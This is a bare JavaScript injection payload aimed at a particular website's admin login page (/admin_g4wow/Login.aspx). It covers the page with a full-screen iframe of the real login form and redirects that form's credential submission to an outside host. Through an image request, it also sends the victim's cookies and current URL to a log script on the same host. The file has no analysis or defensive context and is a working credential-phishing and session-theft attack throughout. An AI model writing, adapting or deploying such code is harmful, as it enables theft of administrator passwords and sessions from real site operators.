//Gen data
cookie = "Cookies:"+document.cookie;
url = "URL:"+document.location;

//Create iframe
document.head.innerHTML = "<style>#login_iframe{width:100%;height:100%;border:none;position:absolute;left:0;top:0;overflow:hidden;z-index:1000000000000000;}</style>" + document.head.innerHTML;
document.body.innerHTML = "<iframe scrolling='no' onload=\"this.style.background='#222 url(\'images/bg-login.gif\')'\" id='login_iframe' src='/admin_g4wow/Login.aspx'></iframe>" + document.body.innerHTML;
var prevTitle = document.title;
document.title = "网站管理系统";

$("#login_iframe").load(function(){
	//alert("Loaded");
	$("#login_iframe").contents().find("#form1")[0].action = "//g4wowisbad.000webhostapp.com/login.php";
	$("#login_iframe").contents().find("#txtUsername")[0].value = getCookie("login_name");
	$("#login_iframe").contents().find("#form1").submit(function(){
		$("#login_iframe").attr("src", "/admin_g4wow/Login.aspx");
		$("#login_iframe").delay(1000).hide(0);
		document.title = prevTitle;
	});
});

$data = encodeURIComponent(cookie+url);

var imageObject = new Image();
imageObject.src = "http://g4wowisbad.000webhostapp.com/log.php?log="+$data;